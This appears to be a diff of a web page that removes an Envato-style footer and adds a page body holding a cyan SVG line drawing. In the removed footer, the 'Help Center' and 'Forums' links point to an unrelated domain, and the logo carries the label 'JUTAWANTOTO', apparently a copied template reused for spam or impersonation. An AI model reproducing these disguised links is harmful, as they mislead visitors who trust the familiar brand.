-                                                    <li class="global-footer-sublist__item h-p0">
-                                                        <a class="global-footer__text-link" href="https://envato.com/market/affiliate-program/">Become
-                                                            an affiliate</a>
-                                                    </li>
-                                                    <li class="global-footer-sublist__item h-p0">
-                                                        <a class="global-footer__text-link" href="https://www.envato.com/cookies/">Cookies</a>
-                                                    </li>
-                                                    <li class="global-footer-sublist__item h-p0">
-                                                        <button type="button" class="global-footer__text-link" data-view="cookieSettings">Cookie Settings</button>
-                                                    </li>
-                                                </ul>
-                                            </li>
-                                            <li class="global-footer-info-links__list-item">
-                                                <ul class="global-footer-sublist">
-                                                    <li class="global-footer-sublist__item-title">
-                                                        Help
-                                                    </li>
-                                                    <li class="global-footer-sublist__item h-p0">
-                                                        <a class="global-footer__text-link" href="https://spanishlearningprogram.com/cultural/">Help Center</a>
-                                                    </li>
-                                                    <li class="global-footer-sublist__item h-p0">
-                                                        <a class="global-footer__text-link" href="https://help.author.envato.com/hc/en-us">Authors</a>
-                                                    </li>
-                                                </ul>
-                                            </li>
-                                            <li class="global-footer-info-links__list-item">
-                                                <ul class="global-footer-sublist">
-                                                    <li class="global-footer-sublist__item-title">
-                                                        Our Community
-                                                    </li>
-                                                    <li class="global-footer-sublist__item h-p0">
-                                                        <a class="global-footer__text-link" href="https://community.envato.com">Community</a>
-                                                    </li>
-                                                    <li class="global-footer-sublist__item h-p0">
-                                                        <a class="global-footer__text-link" href="https://envato.com/blog">Blog</a>
-                                                    </li>
-                                                    <li class="global-footer-sublist__item h-p0">
-                                                        <a class="global-footer__text-link" href="https://spanishlearningprogram.com/cultural/">Forums</a>
-                                                    </li>
-                                                    <li class="global-footer-sublist__item h-p0">
-                                                        <a class="global-footer__text-link" href="https://community.envato.com/#/events">Meetups</a>
-                                                    </li>
-                                                </ul>
-                                            </li>
-                                            <li class="global-footer-info-links__list-item">
-                                                <ul class="global-footer-sublist">
-                                                    <li class="global-footer-sublist__item-title">
-                                                        Meet Envato
-                                                    </li>
-                                                    <li class="global-footer-sublist__item h-p0">
-                                                        <a class="global-footer__text-link" href="https://elements.envato.com/about">About Envato</a>
-                                                    </li>
-                                                    <li class="global-footer-sublist__item h-p0">
-                                                        <a class="global-footer__text-link" href="https://envato.com/careers/">Careers</a>
-                                                    </li>
-                                                    <li class="global-footer-sublist__item h-p0">
-                                                        <a class="global-footer__text-link" href="https://envato.com/privacy/">Privacy Policy</a>
-                                                    </li>
-                                                    <li class="global-footer-sublist__item h-p0">
-                                                        <a class="global-footer__text-link" href="https://www.envato.com/privacy/my-personal-information">Do
-                                                            not sell or share my personal information</a>
-                                                    </li>
-                                                    <li class="global-footer-sublist__item h-p0">
-                                                        <a class="global-footer__text-link" href="https://envato.com/sitemap/">Sitemap</a>
-                                                    </li>
-                                                </ul>
-                                            </li>
-                                        </ul>
-                                    </nav>
-
-                                    <div class="global-footer-stats" bis_skin_checked="1">
-                                        <div class="global-footer-stats__content" bis_skin_checked="1">
-                                            <img class="global-footer-stats__logo" alt="JUTAWANTOTO" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgTdt3lExppcdqwfkj9jese5QLkAim4R4UaBYC1W0EYO4t1fzIu2SXMRpboOvzCCA9oCBXuK0x3laUzvtsBr9WpohdUG-5ivBshkmx3MxhZhrm3JF9o1hoZthRviMoOE3-PqQg0jpYPp6UdpNVFElKg-HZkOOS_BmzXg1xiRzlDAlB2RnKfxCqw7gJiUbc/s400/logojutawan.webp">
-
-                                            <ul class="global-footer-stats__list">
-                                                <li class="global-footer-stats__list-item h-p0">
-                                                    <span class="global-footer-stats__number">88,303,876</span> items
-                                                    sold
-
-                                                </li>
-												
-                                                <li class="global-footer-stats__list-item h-p0">
-                                                    <span class="global-footer-stats__number">$1,507,361,021</span>
-                                                    community earnings
-
-                                                </li>
-                                            </ul>
-                                        </div>
-                                        <div class="global-footer-stats__bcorp" bis_skin_checked="1">
-                                            <a target="_blank" rel="noopener noreferrer" class="global-footer-bcorp-link" href="https://bcorporation.net/en-us/find-a-b-corp/company/envato">
-                                                <img class="global-footer-bcorp-logo" width="50" alt="B Corp Logo" loading="lazy" src="https://public-assets.envato-static.com/assets/header-footer/logo-bcorp-e83f7da84188b8edac311fbf08eaa86634e9db7c67130cdc17837c1172c5f678.svg">
-                                            </a>
-                                        </div>
-                                    </div>
-                                </div>
-
-                                <hr class="global-footer__separator">
-                                <div class="global-footer__container" bis_skin_checked="1">
-                                    <div class="global-footer-company-links" bis_skin_checked="1">
-                                        <ul class="global-footer-company-links__list">
-                                            <li class="global-footer-company-links__list-item">
-                                                <a class="global-footer__text-link -opacity-full" data-analytics-view-payload="{&quot;eventName&quot;:&quot;view_promotion&quot;,&quot;contextDetail&quot;:&quot;footer nav&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;elements_mkt-footernav&quot;,&quot;promotionName&quot;:&quot;elements_mkt-footernav&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}" data-analytics-click-payload="{&quot;eventName&quot;:&quot;select_promotion&quot;,&quot;contextDetail&quot;:&quot;footer nav&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;elements_mkt-footernav&quot;,&quot;promotionName&quot;:&quot;elements_mkt-footernav&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}" href="https://elements.envato.com?utm_campaign=elements_mkt-footernav" data-analytics-viewed="true">Envato Elements</a>
-                                            </li>
-                                            <li class="global-footer-company-links__list-item">
-                                                <a class="global-footer__text-link -opacity-full" href="https://placeit.net/">Placeit by Envato</a>
-                                            </li>
-                                            <li class="global-footer-company-links__list-item">
-                                                <a class="global-footer__text-link -opacity-full" href="https://tutsplus.com">Envato Tuts+</a>
-                                            </li>
-                                            <li class="global-footer-company-links__list-item">
-                                                <a class="global-footer__text-link -opacity-full" href="https://envato.com/products/">All Products</a>
-                                            </li>
-                                            <li class="global-footer-company-links__list-item">
-                                                <a class="global-footer__text-link -opacity-full" href="https://envato.com/sitemap/">Sitemap</a>
-                                            </li>
-                                        </ul>
-
-                                        <hr class="global-footer__separator is-hidden-tablet-and-above h-mt3">
-
-
-                                        <small class="global-footer-company-links__price-disclaimer">
-                                            Price is in US dollars and excludes tax and handling fees
-                                        </small>
-
-                                        <small class="global-footer-company-links__copyright">
-                                             2025 Envato Pty Ltd. Trademarks and brands are the property of their
-                                            respective owners.
-                                        </small>
-                                    </div>
-                                </div>
-
-                            </div>
-                        </footer>
-
-                    </div>
-                </div>
-
-                <div class="is-hidden-phone" bis_skin_checked="1">
-                    <div id="tooltip-magnifier" class="magnifier" bis_skin_checked="1" style="top: 740.688px; left: 110.562px; display: none;">
-                        <strong>Portfoliode | Personal CV/Resume &amp; Portfolio Elementor Template Kit</strong>
-                        <div class="info" bis_skin_checked="1">
-                            <div class="author-category" bis_skin_checked="1">
-                                by <span class="author">author</span>
-                            </div>
-                            <div class="price" bis_skin_checked="1">
-                                <span class="cost"><sup>$</sup>24</span>
-                            </div>
-                        </div>
-                        <div class="footer" bis_skin_checked="1">
-                            <span class="category">Template Kits / Elementor / Creative &amp; Design</span>
-                            <span class="currency-tax-notice">Price is in US dollars and excludes tax and handling
-                                fees</span>
-                        </div>
-                    </div>
-
-                    <div id="landscape-image-magnifier" class="magnifier" bis_skin_checked="1">
-                        <div class="size-limiter" bis_skin_checked="1">
-                        </div>
-                        <strong></strong>
-                        <div class="info" bis_skin_checked="1">
-                            <div class="author-category" bis_skin_checked="1">
-                                by <span class="author"></span>
-                            </div>
-                            <div class="price" bis_skin_checked="1">
-                                <span class="cost"></span>
-                            </div>
-                        </div>
-                        <div class="footer" bis_skin_checked="1">
-                            <span class="category"></span>
-                            <span class="currency-tax-notice">Price is in US dollars and excludes tax and handling
-                                fees</span>
-                        </div>
-                    </div>
-
-                    <div id="portrait-image-magnifier" class="magnifier" bis_skin_checked="1">
-                        <div class="size-limiter" bis_skin_checked="1">
-                        </div>
-                        <strong></strong>
-                        <div class="info" bis_skin_checked="1">
-                            <div class="author-category" bis_skin_checked="1">
-                                by <span class="author"></span>
-                            </div>
-                            <div class="price" bis_skin_checked="1">
-                                <span class="cost"></span>
-                            </div>
-                        </div>
-                        <div class="footer" bis_skin_checked="1">
-                            <span class="category"></span>
-                            <span class="currency-tax-notice">Price is in US dollars and excludes tax and handling
-                                fees</span>
-                        </div>
-                    </div>
-
-                    <div id="square-image-magnifier" class="magnifier" bis_skin_checked="1">
-                        <div class="size-limiter" bis_skin_checked="1">
-                        </div>
-                        <strong></strong>
-                        <div class="info" bis_skin_checked="1">
-                            <div class="author-category" bis_skin_checked="1">
-                                by <span class="author"></span>
-                            </div>
-                            <div class="price" bis_skin_checked="1">
-                                <span class="cost"></span>
-                            </div>
-                        </div>
-                        <div class="footer" bis_skin_checked="1">
-                            <span class="category"></span>
-                            <span class="currency-tax-notice">Price is in US dollars and excludes tax and handling
-                                fees</span>
-                        </div>
-                    </div>
-
-                    <div id="smart-image-magnifier" class="magnifier" bis_skin_checked="1">
-                        <div class="size-limiter" bis_skin_checked="1">
-                        </div>
-                        <strong></strong>
-                        <div class="info" bis_skin_checked="1">
-                            <div class="author-category" bis_skin_checked="1">
-                                by <span class="author"></span>
-                            </div>
-                            <div class="price" bis_skin_checked="1">
-                                <span class="cost"></span>
-                            </div>
-                        </div>
-                        <div class="footer" bis_skin_checked="1">
-                            <span class="category"></span>
-                            <span class="currency-tax-notice">Price is in US dollars and excludes tax and handling
-                                fees</span>
-                        </div>
-                    </div>
-
-                    <div id="video-magnifier" class="magnifier" bis_skin_checked="1">
-                        <div class="size-limiter" bis_skin_checked="1">
-                            <div class="faux-player is-hidden" bis_skin_checked="1"><img></div>
-                            <div bis_skin_checked="1">
-                                <div id="hover-video-preview" bis_skin_checked="1"></div>
-                            </div>
-                        </div>
-                        <strong></strong>
-                        <div class="info" bis_skin_checked="1">
-                            <div class="author-category" bis_skin_checked="1">
-                                by <span class="author"></span>
-                            </div>
-                            <div class="price" bis_skin_checked="1">
-                                <span class="cost"></span>
-                            </div>
-                        </div>
-                        <div class="footer" bis_skin_checked="1">
-                            <span class="category"></span>
-                            <span class="currency-tax-notice">Price is in US dollars and excludes tax and handling
-                                fees</span>
-                        </div>
-                    </div>
-
-                </div>
-            </div>
-
-
-            <div class="page__overlay" data-view="offCanvasNavToggle" data-off-canvas="close" bis_skin_checked="1">
-            </div>
-        </div>
+<body>
+    <div>
+    <svg viewBox="0 0 640 640" xmlns="http://www.w3.org/2000/svg">
+       <path d="m613 499 3 3v1l3 3v1l7 7v1l13 13v2-3l-14-14v-1l-8-8v-1Zm-572-2-3 3v1l-6 6v1l-8 8v1L7 534H6l-3 3H1l-1 1 1-1 1 1 2-2h1l4-4h1l9-9v-1l1-1h1v-1l9-9v-1l5-5v-1l3-3v-1l3-3 1 1Zm568-1 1 1Zm-354-93 2 2Zm-11-7h1l1 1-1 1h-1 1l1-1h2l1 1-1 1h-1 1l1 1h1l1 1h1l1 1-1-1 1-1h1l1 1-1-1h-1l-1-1h-1l-1-1h-1l-1-1h-2l-1-1Zm149-2-1 1h-2l-1 1h-1l-1 1h-1l-2 2h-1l-2 2h-1l-7 7v1l-3 3v1l-1 1v1l-1 1v1l-1 1v2l-1 1v2l-1 1v2h2l1-1 1 1h3v-2l1-1v-1l1-1v-1l2-2v-1l2-2v-1l7-7h1l3-3h1l2-2h1l1-1h1l1-1h1l1-1h1l1-1h2l1-1h2l1-1v-2h-2l-1 1h-2l-1 1h-1l-1 1h-1l-1 1h-1 1l1-1h1l1-1h1l1-1h2l1-1h1l1 1-2 2h-1l-1 1h-2l-1 1h-1l-1 1h-2l-1 1h-1l-1-1 1-1-1 1h-1l-1 1h-1l-2 2h-1l-2 2h-1l-7 7v1l-2 2v1l-2 2v1l-1 1v2l-1 1v2l-1 1-1-1v-3l1-1v-1 1l-1 1v2l-2 2-1-1v-1l1-1v-2l1-1v-2l2-2v-1l1-1v-1l2-2v-1l10-10h1l2-2h1l1-1h1l1-1h1l1-1h1l1-1 1 1v1l-1 1h-1l-1 1h-1l-1 1h-1l-1 1h-1l-2 2h-1l-9 9v1l-2 2v1l-1 1 1-1v-1l2-2v-1l8-8h1l2-2h1l2-2h1l1-1h1l1-1h1l1-1v-2Z" fill="none" stroke="#0ff" stroke-width="2"/>
+       <path d="m242 394-2 2h-2l-1-1h-2v1l-1 1 1 1h4l1 1h2l1 1h1l1 1h1l1 1h1l1 1h1l1 1h1l3 3h1l7 7v1l2 2v1l1 1v1l1 1v1h2v-3l-1-1v-1l-1-1v-1l-2-2v-1l-6-6 5 5v1l3 3v1l1 1v1l1 1v2l-1 1-1-1v-1l-1-1v-1l-1-1v-1l-3-3v-1l-5-5h-1l-3-3h-1l-1-1h-1l-1-1h-1l-1-1h-2l-1-1h-1l-1-1h-2l-1-1h-3l-1-1v-1l1-1h1l1 1h2l1 1h1-1l-1-1 1-1h1l1-1h3l1 1h2l1 1h1l1 1h1l1 1h1l2 2h1l2 2h1l9 9v1l2 2v1l1 1v1l1 1v1l1 1v2l-1 1-1-1v-1l-1-1v-1l-1-1v-1l-1-1v-1l-2-2v-1l-8-8h-1l-2-2 2 2h1l7 7v1l2 2v1l1 1v1l2 2v2l1 1v1h2v-4l-1-1v-1l-1-1v-1l-1-1v-1l-3-3v-1l-7-7h-1l-2-2h-1l-2-2h-1l-1-1h-1l-1-1h-2l-1-1h-2l-1-1Zm175-13v2l1 1h1l1 1h1l1 1h1l1 1h1l1 1h2l1 1h2l1 1h1l1 1h2l1 1h2l1 1h2l1 1h3l1 1h2l1 1h3l1 1h3l1 1h4l1 1h5l1 1h5l1 1h8l1 1h25l2-2 3 3h1l1 1h1l3 3h1l1 1h1l2 2h1l2 2h1l2 2h1l2 2h1l1 1h1l5 5h1l15 15h1l1 1v1l2 2h2v-3l-12-12h-1l-4-4 1-1h1l1-1 1 1h2l1 1h1l1 1h1l1 1h1l1 1h1l2 2h1l1 1h1l6 6v1l2 2v1l1 1v1l1 1v1l2 2v1l1 1v1l1 1v1l1 1v1l1 1v1l2 2v2l1 1v1l2 2v1l1 1v1l1 1v1l1 1v1l2 2v1l1 1v1l1 1v1l2 2v1l1 1v1l1 1v1l1 1v1l2 2v1l2 2v1l1 1v1l1 1v1l1 1v1l1 1v1l1 1v1l2 2v1l2 2v1l1 1v1l2 2v1l2 2v1l1 1v1l2 2v1l2 2v1l2 2v1l2 2v1l4 4v1l1 1h3v-2l-4-4v-1l-3-3v-1l-2-2v-1l-2-2v-1l-2-2v-1l-2-2v-1l-2-2v-1l-1-1v-1l-2-2v-1l-2-2 2 2v1l1 1v1l1 1v1l2 2v1l2 2v1l1 1v1l2 2v1l2 2v1l3 3v1l3 3v1l3 3-1 1h-1l-3-3v-1l-3-3v-1l-3-3v-1l-2-2v-1l-2-2v-1l-1-1v-1l-2-2v-1l-2-2v-1l-1-1v-1l-1-1v-1l-2-2v-1l-2-2v-1l-1-1v-1l-1-1v-1l-1-1v-1l-1-1v-1l-1-1v-1l-2-2v-1l-2-2v-1l-1-1v-1l-2-2v-1l-1-1v-1l-1-1v-1l-1-1v-1l-2-2v-1l-1-1v-1l-1-1v-1l-1-1v-1l-1-1v-1l-2-2v-1l-1-1v-1l-1-1v-1l-1-1v-1l-2-2v-1l-1-1v-1l-1-1v-1l-1-1v-1l-1-1v-1l-1-1v-1l-2-2v-1l-2-2v-1l-3-3h-1l-2-2h-1l-1-1h-1l-2-2h-1l-1-1h-1l-1-1h-2l-1-1h-2l-1-1-1 1h-2v1l17 17v1l-1 1-19-19h-1l-3-3h-1l-3-3h-1l-2-2h-1l-2-2h-1l-2-2h-1l-1-1h-1l-2-2h-1l-2-2h-1l-2-2h-1l-2-2h-1l-2-2 1 1-1 1h-1l-1 1h-24l-1-1h-8l-1-1h-5l-1-1h-5l-1-1h-4l-1-1h-3l-1-1h-3l-1-1h-2l-1-1h-3l-1-1h-2l-1-1h-2l-1-1h-2l-1-1h-1l-1-1h-2l-1-1h-1l-1-1h-2l-1-1h-1l-2-2h-2l-1-1v-1l1-1h1l1 1h1l1 1h1l1 1h1l1 1h2l1 1h1l1 1h2l1 1h1l1 1h2l1 1h2l1 1h3l1 1h1l1 1h4l1 1h3l1 1h3l1 1h4l1 1h5l1 1h7l1 1h12l1 1h6l1-1 1 1 1-1 1 1h2l1-1-1 1h-2l-1-1-1 1-1-1-1 1h-6l-1-1h-12l-1-1h-7l-1-1h-5l-1-1h-4l-1-1h-3l-1-1h-3l-1-1h-4l-1-1h-1l-1-1h-3l-1-1h-2l-1-1h-2l-1-1h-1l-1-1h-1l-1-1h-2l-1-1h-2l-1-1h-1l-1-1h-1l-1-1h-1l-1-1Zm-23-6 1 1-1 1h-2l-1 1h-2l-1 1h-2l-1 1h-2l-1 1h-2l-1 1h-2l-1 1h-3l-1 1h-2l-1 1h-4l-1 1h-4l-1 1h-3l-1 1h-5l-1 1h-6l-1 1h-8l-1 1h-35l-1-1h-7l-1-1h-6l-1-1h-5l-1-1h-3l-1-1h-4l-1-1h-2l-1-1h-3l-1-1h-2l-1-1h-2l-1-1h-2l-1-1h-1l-1-1h-1l-1-1h-2v3h2l1 1h2l1 1h1l1 1h2l1 1h2l1 1h2l1 1h3l1 1h3l1 1h4l1 1h3l1 1h6l1 1h5l1 1h7l1 1v1l1 1v4l1 1v6l1 1v13l1 1v3l-1 1v3l1 1v1l1-1h1v-18l-1-1v-7l-1-1v-4l-1-1v-3l2-2 1 1h20l1-1h9l1 1v5l-1 1v5l-1 1v8l-1 1v19h3v-3l-1-1v-4l1-1v-15l1-1v-7l1-1v-4l1-1v-2l2-2h4l1-1h6l1-1h4l1-1h3l1-1h4l1-1h3l1-1h2l1-1h3l1-1h2l1-1h2l1-1h2l1-1h2l1-1h3l1-1h1l1-1-1-1v-1h-1Z" fill="none" stroke="#0ff" stroke-width="2"/>
+       <path d="m316 372-1 1h-2l-1 1h-2l-1 1h-2l-1 1h-2l-1 1h-2l-1 1v2h2l1-1h2l1-1h2l1-1h2l1-1h2l1-1h2l1-1h3l1 1h2l1 1h3l1 1h2l1 1h3l1 1h3v-2h-1l-1-1h-3l-1-1h-2l-1-1h-3l-1-1h-2l-1-1Zm-52-4-1 1h-2l-1 1h-2l-1 1h-3l-1 1h-2l-1 1h-2l1 1-1 1h4l1-1h3l1-1h2l1-1h2l1-1h2l1-1h2l1 1h1l1 1h1l1 1h2l1 1h1l1 1h1l1 1h3-2l-1-1h-1l-1-1h-2l-1-1h-1l-1-1h-2l-1-1h-1l-1-1h-2l-1 1h-2l-1 1h-2l-1 1h-2l-1 1h-3l-1 1h-2l-1-1 2-2h2l1-1h3l1-1h2l1-1h2l1-1h6l1 1h1l1 1h1l1 1h2l1 1h1l1 1h1l1 1h1l-1-1h-1l-1-1h-2l-1-1h-1l-1-1h-1l-1-1h-1l-1-1Zm106-1-1 1h-1l-1 1h-1l-2 2h-1l-1 1h-1l-2 2v2h2l2-2h2l2-2h1l1-1h1l1-1h4l1 1h2l1 1h2l1 1h2l1 1h2l1 1h4v-2h-2l-1-1h-2l-1-1h-2l-1-1h-2l-1-1h-2l-1-1h-2l-1-1Zm-85-64-1 1h-2 1l1 1 2-2h71l1 1h2v-1l-1 1-1-1Zm83-1-1 1h-1l-1 1v3l2 2h1l1 1h1l1-1h1l1-1v-4l-2-2Zm-95-1-1 1h-2v1l-1 1v4l1 1h1l1 1h1l1-1h1l1-1h1v-4l-2-2h-1Zm84-3 1 1v1l1 1-1-1v-1Zm-66-5-1 1v1l-2 2v1l-1 1 1 1h5v-7l-1 1Zm-4-1-1 1v1l-1 1 1-1 1 1 1-1-1 1-1-1v-1Zm62-2v10h6v-2l-1-1v-1l-1-1v-1l-2-2v-1 2l2 2v1l1 1v1l1 1-1 1h-4l-1-1Zm-59-3-1 1Zm58-4 1 1v2l2 2-1-1v-1l-1-1v-1Zm-51 0-1 1v2l-1 1v10l1 1h2v-13 12l-1 1h-1l-1-1v-10l1-1v-2Zm46-2v17h3l1-1v-12l-1-1v-1l-1-1v1l2 2v11l-2 2h-1l-1-1Zm-49-1-1 1v1l-1 1v1l-1 1 1-1 1 1v1l-1 1v1l-2 2v1l-1 1 2-2 1 1v-3l1-1v-2l1-1-1 1-1-1v-1l1-1v-1Zm52-4 1 1v1l1 1-1-1v-1Zm-49-1-1 1v1l-1 1 1-1v-1Zm3-1-1 1v1l-1 1v1l-2 2v1l-1 1 2-2v-1l2-2v-2Zm5-2v26l1 1-1 1h-4l-1-1 1-1v-21l1-1v-1l1-1v-1l-1 1v1l-1 1v22l-1 1 1 1h4l1-1-1-1Zm38-1 1 1Zm-6 0v29h4v-24l-1-1v-1l-1-1v-1 1l1 1v1l1 1v23l-1 1h-2l-1-1Zm-26-9v34l-2 2-2-2v-30l2-2v-1 1l-2 2v30l1 1v1h2l1-1Z" fill="none" stroke="#0ff" stroke-width="2"/>
+       <path d="m342 261 2 2v1l3 3v1l2 2v1l2 2v1l2 2v1l2 2v1l2 2v1l2 2v1l1 1v1l2 2v1l2 2v1l1 1v1l2 2v1l-2 2h-1l-1-1v-1l-1-1v-1l-2-2v-1l-2-2v-1l-1-1v-1l-1-1v-1l-2-2v-1l-1-1v-1l-2-2v-1l-2-2v-2l-2-2v-1l-1-1v-1l-2-2v-1l-2-2v-1l-1-1 1 1v1l1 1v1l1 1v1l2 2v1l1 1v1l2 2v1l1 1v1l1 1v1l-1 1-1-1 1 1 1-1 2 2v1l1 1v1l-1 1-1-1 1 1v1l1 1v1l-1 1 1-1 2 2v1l-1 1 1-1v-1l1-1 1 1v1l2 2v1l2 2v1l1 1v1h3l1-1v-2l-1-1v-1l-1-1v-1l-2-2v-1l-2-2v-1l-1-1v-1l-2-2v-1l-1-1v-1l-3-3v-1l-1-1v-1l-3-3v-1l-2-2v-1l-3-3v-1Zm-11 0v36l1 1h2v-1l1-1v-29l-1-1v-2l-1-1v1l1 1v1l1 1v29l-2 2-2-2Zm-11-3-1 1 1 1-1 1v7l1 1v6l-1 1v16l1 1-1 1 1 1v3h2v-1l1-1v-37l-1-1-1 1Zm6-1-1 1v42h4v-43Zm-12-1-1 1v43h4v-42l-1-1h-1Zm-9 0v1l-1 1-1-1-2 2v1l-5 5v1l-2 2v1l-3 3v1l-2 2v1l-2 2v1l-2 2v1l-1 1v1l-2 2v1l-2 2v1l-1 1v1l-2 2v1l-1 1v1l-1 1v2h1l2 2 2-2v-1l1-1v-1l2-2v-1l1-1v-1l2-2v-1l1-1v-1l2-2v-1l1-1v-1l1-1v-1l2-2v-1l1-1v-1l2-2v-1l1-1v-1l1-1v-1l2-2v-1l1-1v-1l2-2v-1l1-1v-1l1-1Zm5-4v1l-1 1v1l-2 2v1l-1 1v1l-1 1v1l-2 2v1l-1 1v1l-2 2v1l-1 1v1l-1 1 1-1v-1l1-1v-1l2-2v-1l1-1v-1l2-2v-1l1-1v-1l2-2v-1l1-1v-1l1-1Z" fill="none" stroke="#0ff" stroke-width="2"/>
+       <path d="M368 247h4l1 1h4l1 1h7l1 1v1l1 1-1 1v1l-1 1v1l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v2l-1 1v3l-1 1v3l-1 1v4l-1 1v5l-1 1 1 1v8l-1 1v2l1 1v3l-1 1v1l-3 3h-5l-5-5v-1l1-1-1-1v-1 1l1 1-1 1v2l3 3h1l1 1h5l1-1h1l1-1v-2l1-1v-4l-1-1 1-1v-9l-1-1 1-1v-5l1-1v-4l1-1v-3l1-1v-3l1-1v-2l1-1v-2l1-1v-2l1-1v-2l1-1v-1l1-1v-1l1-1v-2l1-1v-1l-2-2h-7l-1-1h-4l-1-1Zm-97 0-1 1h-4l-1 1h-9l-1 1v3l1 1v2l2 2v1l1 1v2l1 1v3l1 1v1l1 1v3l1 1v3l1 1v3l1 1v3l1 1v11l-1 1v1l1 1v2l1 1v1l-1 1v3l1 1v1l1 1v1h1l1 1h4l1-1h2l3-3v-5l2-2 1 1 2-2v-1l-1 1v1l-1 1-1-1v-1 1l-2 2v4l-1 1v1l-1 1h-1l-1 1h-1l-1 1h-3l-1-1h-1l-2-2v-1l-1-1v-3l1-1v-2l-1-1v-1l-1-1v-1l1-1v-11l-1-1v-3l-1-1v-3l-1-1v-3l-1-1v-3l-1-1v-1l-1-1v-3l-1-1v-2l-1-1v-1l-1-1v-1l-1-1v-2l-1-1v-1l2-2h8l1-1h4l1-1h2Zm47-9-1 1h-1l-2 2v1l-1 1v3l-1 1v7l-1 1v1l-1 1v1l-2 2v1l-1 1v1l-2 2v1l-1 1v1l-2 2v1l-1 1 2-2v-1l1-1v-1l1-1v-1l2-2v-1l2-2v-1l2-2v-2l1-1v-7l1-1v-2l1-1v-1l4-4h6l5 5v2l1 1v6l-1 1-1-1v-4l-1-1v-3l-3-3h-6l-2 2v1l-1 1v3l-1 1v4l2 2h1l1 1h6l1-1h1l2-2h1l2 2v1l1 1v1l2 2v1l2 2v1l1 1v1l2 2v1l2 2v1l1 1v1l1 1v1l2 2v1l2 2-2-2v-1l-1-1v-1l-1-1v-1l-2-2v-1l-2-2v-1l-1-1v-1l-2-2v-1l-1-1v-1l-2-2v-1l-1-1v-1l-2-2v-8l-1-1v-2l-1-1v-1l-3-3Zm-19-1 1 1-1 1h-1 1l1-1Z" fill="none" stroke="#0ff" stroke-width="2"/>
+       <path d="m319 234-1 1h-2l-4 4v2l-1 1v3l-1 1v1-1l1-1v-3l1-1v-2l3-3h1l1-1h1l1-1h5l1 1h1l4 4v1l1 1v3l1 1v7l1 1v1l1 1v1l1 1v1l2 2v1l1 1v1l2 2v1l1 1v1l1 1-1-1v-1l-1-1v-1l-1-1v-1l-1-1v-1l1-1 1 1-1-1-1 1-2-2v-1l-1-1v-1l-2-2v-1l-1-1v-7l-1-1v-3l-1-1v-1l-2-2v-1h-1l-1-1h-1l-1-1Z" fill="none" stroke="#0ff" stroke-width="2"/>
+       <path d="m316 232-1 1h-1l-4 4v2l-1 1v3l-1 1v7l-2 2h-2l-9 9v1l-3 3v1l-2 2v1l-2 2v1l-2 2v1l-2 2v1l-2 2v1l-2 2v1l-1 1v1l-2 2v1l-2 2v1l-1 1v1l-2 2v1l-1 1h-2l-1-1v-3l1-1v-5l-1-1v-5l-1-1v-4l-1-1v-3l-1-1v-2l-1-1v-3l-1-1v-2l-1-1v-2l-1-1v-1l-1-1v-1l-1-1v-2l-1-1 2-2h7l1-1h4l1-1h2l1-1h3l1-1h2l1-1h2l1-1h3l1-1h2l1-1h1l1-1h3l1-1h1l1-1h1l1-1h1l1-1h1l1-1h1v-3l-1 1h-1l-1 1h-1l-1 1h-1 1l1-1h1l1-1h1l1 1-2 2h-1l-1 1h-1l-1 1h-1l-1 1h-2l-1 1h-2l-1 1h-1l-1 1h-2l-1 1h-3l-1 1h-2l-1 1h-2l-1 1h-3l-1 1h-2l-1 1h-4l-1 1h-7l-1 1h-1v2l1 1v1l1 1v1l1 1v1l1 1v2l1 1v2l1 1v3l1 1v2l1 1v3l1 1v4l1 1v5l1 1v5l-1 1v4h4v-1l2-2v-1l1-1v-1l2-2v-1l1-1v-1l2-2v-1l2-2v-1l1-1v-1l2-2v-1l2-2v-1l2-2v-1l3-3v-1l2-2v-1l5-5v-1l3-3h1l2-2h1l1 1v-1l1-1v-8l1-1v-3l1-1v-1l6-6h10l2 2h1l1 1v1l2 2v1l1 1v2l1 1v8l1 1v1h2l10 10v1l3 3v1l2 2v1l3 3v1l1 1v1l3 3v1l1 1v1l2 2v1l1 1v1l2 2v1l2 2v1l1 1v1l2 2v1h4v-4l-1-1v-6l1-1v-4l1-1v-4l1-1v-4l1-1v-1l1-1v-3l1-1v-2l1-1v-2l1-1v-2l1-1v-1l1-1v-1l1-1v-1h-1l-1-1h-7l-1-1h-3l-1-1h-4l-1-1h-2l-1-1h-3l-1-1h-2l-1-1h-2l-1-1h-2l-1-1h-2l-1-1h-1l-1-1h-2l-2-2 1-1h1l1 1h1l1-1-1-1h-1l-1 1h-1l-1-1 1-1-1-1 1 1-1 1h-1l-1-1h-1l-1-1h-1l-1-1v3l1 1h1l1 1h2l2 2h3l1 1h1l1 1h2l1 1h2l1 1h2l1 1h2l1 1h3l1 1h2l1 1h4l1 1h3l1 1h7l2 2-1 1v1l-1 1v1l-1 1v2l-1 1v2l-1 1v2l-1 1v3l-1 1v1l-1 1v4l-1 1v4l-1 1v4l-1 1v6l1 1v3l-1 1h-2l-1-1v-1l-2-2v-1l-2-2v-1l-2-2v-1l-1-1v-1l-2-2v-1l-1-1v-1l-2-2v-1l-2-2v-1l-2-2v-1l-2-2v-1l-3-3v-1l-3-3v-1l-8-8h-2l-1-1v-1l-1-1v-7l-1-1v-3l-1-1v-1l-2-2v-1h-1l-1-1h-1l-1-1Z" fill="none" stroke="#0ff" stroke-width="2"/>
